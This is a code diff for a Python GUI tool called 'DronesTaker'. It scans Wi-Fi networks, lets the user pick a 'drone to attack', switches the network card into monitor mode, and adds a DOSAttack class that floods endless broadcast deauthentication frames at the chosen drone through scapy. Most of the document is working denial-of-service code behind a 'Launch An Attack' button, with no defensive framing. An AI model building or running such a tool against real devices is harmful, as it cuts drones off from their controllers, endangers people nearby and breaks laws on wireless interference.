@@ -1,11 +1,12 @@
+import logging
 import os
 import time
 from threading import Thread
 from tkinter import *
 import pandas
 import psutil
-from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt
-from scapy.sendrecv import sniff
+from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt, RadioTap, Dot11Deauth
+from scapy.sendrecv import sniff, sendp
 
 myFont = ("Tahoma", 11)
 
@@ -29,20 +30,17 @@ class DronesTaker:
         self.root.option_add('*Dialog.msg.font', 'Tahoma 10')
 
         network_card = "Choose a network interface"
-        drone_picker = "Choose a drone to attack"
         attack_type = "Choose an attack type"
 
         choices = psutil.net_if_addrs()
 
         Label(self.root, text=network_card, font=myFont).place(x=5, y=10)
         Label(self.root, text=attack_type, font=myFont).place(x=5, y=45)
-        Label(self.root, text=drone_picker, font=myFont).place(x=5, y=85)
         Button(self.root, text="Scan", command=self.set_card, width=7, height=3, font=myFont).place(x=460, y=6)
 
         card_options = OptionMenu(self.root, self.network_card, *choices)
         card_options.config(width=21, font=myFont)
         card_options.place(x=220, y=5)
-        # self.network_card.trace_add("write", callback=self.set_card)
 
         attack_options = OptionMenu(self.root, self.attack_card, "Deauthentication packets", "ICMP")
         attack_options.config(width=21, font=myFont)
@@ -55,18 +53,52 @@ class DronesTaker:
         scanData = scanObj.getAPs()
         for row in scanData.itertuples():
             self.itemList.append([row.Index, row.SSID, row.dBm_Signal])
+
+        drone_picker = "Choose a drone to attack"
+        Label(self.root, text=drone_picker, font=myFont).place(x=5, y=85)
+
         self.drone_options = OptionMenu(self.root, self.drone_ssid, *self.itemList)
         self.drone_options.config(width=32, font=myFont)
         self.drone_options.place(x=220, y=80)
+
+        Button(self.root, text="Launch An Attack", command=self.dos_attack_thread, width=58, font=myFont).place(x=5,
+                                                                                                                y=120)
 
     def set_monitor_mode(self):
         os.system("ifconfig " + self.network_card.get() + " down")
         os.system("iwconfig " + self.network_card.get() + " mode monitor")
         os.system("ifconfig " + self.network_card.get() + " up")
 
+    def dos_attack_thread(self):
+        self.drone_ssid.set(self.drone_ssid.get()[2:self.drone_ssid.get().find(' ') - 2])
+
+        dosThread = Thread(target=self.start_dos_thread, args=(self.network_card.get(), self.drone_ssid.get(),))
+        dosThread.daemon = True
+        dosThread.start()
+
+    def start_dos_thread(self, interface, target):
+        dosObj = DOSAttack(interface, target)
+        dosObj.run()
+
     def run(self):
         self.conf()
         self.root.mainloop()
+
+
+class DOSAttack:
+    def __init__(self, interface, target):
+        self.interface = interface
+        self.target = target
+
+    def run(self):
+        dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.target, addr3=self.target)
+        packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
+
+        try:
+            sendp(packet, inter=0.1, count=None, loop=1, iface=self.interface, verbose=0)
+        except Exception as e:
+            logging.exception(e)
+            print("DOS STOPPED")
 
 
 class WiFiScan:
